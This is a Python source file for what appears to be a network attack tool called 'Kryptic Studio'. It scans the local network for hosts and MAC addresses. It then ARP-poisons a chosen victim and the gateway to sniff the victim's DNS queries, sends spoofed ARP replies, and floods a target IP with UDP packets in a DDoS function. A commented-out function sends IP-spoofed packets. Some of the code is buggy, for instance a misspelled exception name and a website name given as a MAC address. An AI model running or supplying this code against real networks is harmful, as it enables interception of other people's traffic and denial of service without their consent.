### Kryptic Studio ###

# Local Libraries

# Libraries
try:
    from scapy.all import *
except:
    print("\nERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.")
# Standard Libraries
try:
    import os
    import signal
    import sys
    import threading
    import time
    import subprocess
    import socket
    from urllib.request import urlopen, Request
    from kamene.config import conf  
    conf.ipv6_enabled = False
    from kamene.all import *
    import scan, spoof, nmap
    from urllib.error import URLError
    import random
    from random import randint
    import contextlib
    from socket import gethostbyname
except:
    print("\nERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.")
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
# Function Deffinitions

## GLOBAL VARS
self_ip = str(subprocess.check_output("ipconfig getifaddr en0", shell=True))[2:-3]
lan = self_ip.split(".")
lan = lan[0] + "." + lan[1] + "." + lan[2]
nmap_broadcast = lan + ".1/24"
gateway_ip = str(subprocess.check_output("route get default | grep gateway | cut -f 2 -d \":\"", shell=True))[3:-3]
gateway_mac = ""
hosts = dict()

localtime = time.asctime(time.localtime(time.time()) )

localtime = localtime[11:16]

if localtime[:1] in ["12", "13","14", "15","16", "17","18", "19","20", "21", "22", "23"]:
    localtime += " PM"
else:
    localtime += " AM"

## Checks for internet connection
def checkInternetConnection():
    try:
        urlopen('https://github.com', timeout=3)
        return True
    except URLError as err:
        return False
    except KeyboardInterrupt:
        return

def get_online_hosts_with_mac():
    os.system('clear')
    print("Searching for clients with mac addresses in the LAN...")
    nmap_broadcast = lan + ".1/24"
    subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
    arp_result = subprocess.check_output("arp -a", shell=True)
    if arp_result == "":
        print("No online clients were found.")
        return
    arp_result = arp_result.decode().split('\n')
    del arp_result[-1]
    for host in arp_result:
        host = host.split(" ")
        if host[3] == "(incomplete)":
            continue
        global hosts
        hosts[host[1][1:-1]] = host[3]
        global gateway_ip
        global gateway_mac
        if host[1][1:-1] == gateway_ip:
            gateway_mac = host[3]
    print("%-15s %-30s %-15s %-35s %s"%("Gateway", "Vendor", "IP", "MAC", "First seen"))

def monitor_online_hosts_with_mac():
    os.system('clear')
    print("Searching for clients with mac addresses in the LAN...")
    nmap_broadcast = lan + ".1/24"
    subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
    arp_result = subprocess.check_output("arp -a", shell=True)
    if arp_result == "":
        print("No online clients were found.")
        return
    arp_result = arp_result.decode().split('\n')
    del arp_result[-1]
    for host in arp_result:
        host = host.split(" ")
        if host[3] == "(incomplete)":
            continue
        global hosts
        hosts[host[1][1:-1]] = host[3]
        global gateway_ip
        global gateway_mac
        if host[1][1:-1] == gateway_ip:
            gateway_mac = host[3]


def resolveMac(mac):
    try:
        # send request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        request = Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]

        if vendor == "No vendor":
            vendor = "N/A"
        return vendor
    except:
        return "N/A"

def get_clients_OnLan():
    global localtime
    try:
        if checkInternetConnection():
            pass
        else:
            os.system('clear')
            print("\n{}ERROR: It seems that you are offline. Please check your internet connection.{}\n".format(RED, END))
            return
    except KeyboardInterrupt:
        shutdown()
    get_online_hosts_with_mac()
    for key, value in hosts.items():
        if key == gateway_ip and value == gateway_mac:
            print("%-15s %-30s %-15s %-35s %s"%("Yes", resolveMac(value), key, value, "--"))
            continue
        if key == self_ip:
            print("%-15s %-30s %-15s %-35s %s (Your Machine)"%("", resolveMac(value), key, value, localtime))
            continue
        try:
            print("%-15s %-30s %-15s %s %-35s %s"%("", resolveMac(value), key, value, socket.gethostbyaddr(key), localtime))
        except Exception as e:
            print("%-15s %-30s %-15s %-35s %s"%("", resolveMac(value), key, value, localtime))

def monitor_clients_OnLan():
    global localtime
    try:
        if checkInternetConnection():
            pass
        else:
            os.system('clear')
            print("\n{}ERROR: It seems that you are offline. Please check your internet connection.{}\n".format(RED, END))
            return
    except KeyboardInterrupt:
        shutdown()
    while True:
        monitor_online_hosts_with_mac()
        os.system("clear")
        print("%-15s %-30s %-15s %-35s %s"%("Gateway", "Vendor", "IP", "MAC", "First seen"))
        for key, value in hosts.items():
            if key == gateway_ip and value == gateway_mac:
                print("%-15s %-30s %-15s %-35s %s"%("Yes", resolveMac(value), key, value, "--"))
                continue
            if key == self_ip:
                print("%-15s %-30s %-15s %-35s %s (Your Machine)"%("", resolveMac(value), key, value, localtime))
                continue
            try:
                print("%-15s %-30s %-15s %s %-35s %s"%("", resolveMac(value), key, value, socket.gethostbyaddr(key), localtime))
            except Exception as e:
                print("%-15s %-30s %-15s %-35s %s"%("", resolveMac(value), key, value, localtime))
        time.sleep(60)

def traffic_sniff():
    global localtime

    try:
        if checkInternetConnection():
            pass
        else:
            os.system('clear')
            print("\n{}ERROR: It seems that you are offline. Please check your internet connection.{}\n".format(RED, END))
            return
    except KeyboardInterrupt:
        return

    get_clients_OnLan()
    clientIP = input("Client's IP: ")
    global self_ip
    if clientIP == self_ip:
        print("You can not sniff your self. ")
        return
    global gateway_ip
    gatewayIP = gateway_ip
    interface = input('Interface: ')

    print("\n* Enabling IP Forwarding...")

    os.system('sudo sysctl -w net.inet.ip.forwarding=1') #Ensure the victim recieves packets by forwarding them

    print('\t\t\nAttacking Client & Gateway... ')

    def dnshandle(pkt):
    	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: #Strip what information you need from the packet capture
        	print('{}>>> Client: {} has searched for:  {}'.format(localtime, clientIP, str(pkt.getlayer(DNS).qd.qname)[2:-2]))

    def v_poison():
        v = ARP(pdst=clientIP, psrc=gatewayIP)
        while True:
            try:
                send(v,verbose=0,inter=1,loop=1)
            except KeyboardInterupt: # Functions constructing and sending the ARP packets
                return

    def gw_poison():
        gw = ARP(pdst=gatewayIP, psrc=clientIP)
        while True:
            try:
                send(gw,verbose=0,inter=1,loop=1)
            except KeyboardInterupt:
                return

    vthread = []
    gwthread = []

    
    while True: # Threads 
        vpoison = threading.Thread(target=v_poison)
        vpoison.setDaemon(True)
        vthread.append(vpoison)
        vpoison.start()    
        gwpoison = threading.Thread(target=gw_poison)
        gwpoison.setDaemon(True)
        gwthread.append(gwpoison)
        gwpoison.start()
        
        pkt = sniff(iface=interface,filter='udp port 53',prn=dnshandle)

def httpRedirect():
    get_clients_OnLan()
    clientIP = input("Client's IP: ")
    clientMAC = input("Client's MAC: ")
    global gateway_ip
    gatewayIP = gateway_ip
    gatewayMAC = input("Gateway MAC: ")
    interface = input('Interface: ')

    os.system('sudo sysctl -w net.inet.ip.forwarding=1') #Ensure the victim recieves packets by forwarding them

    send(ARP(op = 2, pdst = clientIP, psrc = gatewayIP, hwdst= "www.Kryptic-studio.com"))
    send(ARP(op = 2, pdst = gatewayIP, psrc = clientIP, hwdst="www.Kryptic-studio.com"))

''' def ipSpoof():
    try:
        targetIP = input("Target IP: ")
        destinationIP = input("Destination IP: ")
        data = input("Packet Data(Optional): ")
        pktNum = int(input("Number of Packets to send: "))
        count = 0
        while count <= pktNum - 1:
            count += 1
            ip_layer = IP(src=targetIP, dst=destinationIP)
            tcp_layer = TCP()
            pkt = ip_layer/tcp_layer/data
            with open(os.devnull, "w") as f, contextlib.redirect_stdout(f):
                try:
                    send(pkt)
                except:
                    return
        print("\n{} packets sent from spoofed ip {} to ip {}.".format(count, targetIP, destinationIP))
    except:
        print("Packet Failed to send.")
    return '''

def ddosAttack():
    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############

    os.system("Kryptic DDos Attack")
    ip = input("IP Target: ")
    port = int(input("Port: "))
    portMax = int(input("Max Port: "))

    os.system("Kryptic Attack Starting")

    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print("Packet # {} sent to IP {} through port {}".format(sent,ip,port))
        if port == portMax:
            return
    os.system("clear")
    print("AttacK to {} complete!".format(ip))